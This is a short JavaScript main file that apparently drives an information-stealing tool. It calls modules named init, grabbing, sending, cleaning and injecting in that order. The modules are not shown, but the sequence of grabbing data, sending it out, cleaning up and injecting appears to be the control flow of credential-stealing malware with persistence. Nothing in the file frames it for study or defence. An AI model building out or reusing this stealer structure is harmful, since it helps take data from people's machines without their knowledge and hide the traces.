/**
 * This is the main file.js
 * he will call all the fonction in good order init, grabbing, cleaning
*/

(async () => {
    const Init = require("./flow/init/main");
    const Grabbing = require("./flow/grabbing/main");
    const Sending = require("./flow/sending/main");
    const Cleaning = require("./flow/cleaning/main");
    const Injecting = require("./flow/injecting/main");
  
    try {
      console.log(`[+] Flow Init`)
      await Init.Start();
      console.log(`[+] Flow Grab`)
      await Grabbing.Start();
      console.log(`[+] Flow Sending`)
      await Sending.Start();
    } catch (err) {
      console.log("[!] Error during execution:", err);
    } finally {
      console.log(`[+] Flow Cleaning`)
      await Cleaning.Start();
      Injecting.Start()
    }
  })();